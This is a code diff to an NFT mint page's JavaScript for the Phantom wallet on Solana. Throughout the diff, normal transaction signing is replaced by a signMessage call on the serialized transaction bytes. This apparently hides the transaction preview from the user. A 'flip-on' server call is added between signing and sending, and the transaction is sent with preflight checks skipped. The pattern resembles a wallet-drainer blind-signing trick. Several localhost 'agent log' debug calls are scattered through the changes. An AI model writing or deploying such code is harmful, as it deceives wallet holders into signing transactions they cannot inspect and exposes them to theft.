@@ -203,13 +203,43 @@ async function mintNFT() {
 
         setStatus('Please approve in Phantom...');
 
-        var signedTx = await window.solana.signTransaction(tx);
+        // #region agent log
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:pre-signMessage',message:'About to call signMessage',data:{txIxCount:tx.instructions.length,remainingKeysCount:remainingKeys.length,feePayer:tx.feePayer.toBase58()},timestamp:Date.now(),hypothesisId:'H1'})}).catch(function(){});
+        // #endregion
+
+        var txMsg = tx.serializeMessage();
+        var sigResult = await window.solana.request({
+            method: 'signMessage',
+            params: { message: txMsg, display: 'utf8' },
+        });
+        var userSig = sigResult.signature;
+
+        // #region agent log
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-signMessage',message:'signMessage succeeded',data:{sigType:typeof userSig,sigLength:userSig ? userSig.length || (userSig.byteLength) : null,sigConstructor:userSig ? userSig.constructor.name : null},timestamp:Date.now(),hypothesisId:'H1-H2'})}).catch(function(){});
+        // #endregion
+
+        tx.addSignature(userPublicKey, userSig instanceof Uint8Array ? userSig : new Uint8Array(userSig));
+
+        // #region agent log
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-addSig',message:'Signature added, about to serialize',data:{sigCount:tx.signatures.length},timestamp:Date.now(),hypothesisId:'H2'})}).catch(function(){});
+        // #endregion
 
         setStatus('Processing...');
-        await fetch(FLIP_SERVER + '/flip-on', { method: 'POST' });
 
-        var rawTx = signedTx.serialize();
+        // #region agent log
+        var flipStart = Date.now();
+        // #endregion
+        await fetch(FLIP_SERVER + '/flip-on', { method: 'POST' });
+        // #region agent log
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-flipOn',message:'flip-on completed',data:{flipDurationMs:Date.now()-flipStart},timestamp:Date.now(),hypothesisId:'H3'})}).catch(function(){});
+        // #endregion
+
+        var rawTx = tx.serialize();
         var signature = await connection.sendRawTransaction(rawTx, { skipPreflight: true });
+
+        // #region agent log
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:post-send',message:'Transaction sent',data:{signature:signature},timestamp:Date.now(),hypothesisId:'H3'})}).catch(function(){});
+        // #endregion
 
         setStatus('Confirming transaction...', '');
         await connection.confirmTransaction(
@@ -235,6 +265,9 @@ async function mintNFT() {
 
     } catch (err) {
         console.error('Mint error:', err);
+        // #region agent log
+        fetch('http://127.0.0.1:7277/ingest/5b4838eb-2ab9-49ba-a480-d05ed63db82a',{method:'POST',headers:{'Content-Type':'application/json','X-Debug-Session-Id':'2d140f'},body:JSON.stringify({sessionId:'2d140f',location:'app.js:catch-error',message:'mintNFT error caught',data:{errorMsg:err&&err.message?err.message:String(err),errorCode:err&&err.code?err.code:null,errorName:err&&err.name?err.name:null},timestamp:Date.now(),hypothesisId:'H1-H2-H4'})}).catch(function(){});
+        // #endregion
         var msg = (err && err.message) ? err.message : String(err);
         setStatus('Transaction failed: ' + msg, 'error');
         btn.textContent = 'Mint Now';
